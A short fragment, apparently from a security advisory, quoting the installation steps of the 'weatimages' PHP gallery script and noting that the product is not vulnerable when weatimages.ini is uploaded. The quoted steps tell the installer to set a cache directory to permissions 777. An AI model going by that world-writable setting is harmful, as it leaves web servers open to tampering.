side note:

4. Installation

Unpack file &quot;index.php&quot; from this archive and upload it to separate directory (e.g. &quot;photos/&quot;) on your web server.
In order to enable caching capabilities, you need to create the new directory named &quot;weatimages-cache&quot; in directory 
with &quot;index.php&quot; and to set access rights 777 (rwxrwxrwx) to &quot;weatimages-cache&quot;.
If you plan to customize configuration, upload &quot;weatimages.ini&quot; too.

If weatimages.ini was uploaded too then the product isn't vulnerable.
